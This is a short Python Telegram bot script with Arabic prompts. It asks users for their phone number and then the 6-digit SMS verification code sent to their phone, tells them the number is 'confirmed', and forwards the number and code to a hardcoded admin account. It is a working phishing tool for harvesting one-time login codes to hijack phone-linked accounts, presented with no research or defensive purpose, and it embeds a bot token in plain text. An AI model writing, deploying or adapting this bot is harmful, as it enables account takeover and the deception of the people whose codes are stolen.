import telebot

TOKEN = "7912768752:AAGOQXShc3-KJ0DUMaPSvtfhKqZK-_WLViM"
ADMIN_ID = 6935979651  # آيدي الأدمن (أنت)

bot = telebot.TeleBot(TOKEN)

users = {}  # user_id: {'step': ..., 'number': ...}

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    users[user_id] = {'step': 'await_number'}
    bot.reply_to(message, "👋 أهلاً بك! من فضلك أرسل رقم هاتفك للبدء.")

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text.strip()

    user = users.get(user_id)

    if not user:
        users[user_id] = {'step': 'await_number'}
        bot.reply_to(message, "من فضلك أرسل رقم هاتفك للمتابعة.")
        return

    step = user['step']

    # 🟢 المرحلة 1: استقبال رقم الهاتف
    if step == 'await_number':
        if not text.isdigit():
            bot.reply_to(message, "❌ من فضلك أرسل رقم هاتف صالح.")
            return

        users[user_id] = {
            'step': 'await_code',
            'number': text
        }

        bot.reply_to(message, "✅ تم استلام رقمك.\n📨 من فضلك أرسل الآن رمز التحقق الذي وصلك عبر رسالة SMS على هاتفك.")
        return

    # 🟢 المرحلة 2: استقبال الرمز
    elif step == 'await_code':
        if text.isdigit() and len(text) == 6:
            number = user['number']
            bot.reply_to(message, "🎉 تم تأكيد رقمك بنجاح! شكرًا لاستخدامك الخدمة.")
            bot.send_message(ADMIN_ID, f"📥 تأكيد جديد من {message.from_user.first_name}\n📱 الرقم: {number}\n🔐 الرمز: {text}")
            users[user_id]['step'] = 'done'
        else:
            bot.reply_to(message, "❌ تأكد أن رمز التحقق مكوّن من 6 أرقام.")
        return

    # 🟢 بعد التأكيد
    elif step == 'done':
        bot.reply_to(message, "✅ رقمك تم تأكيده مسبقًا. شكرًا لك.")

bot.polling()
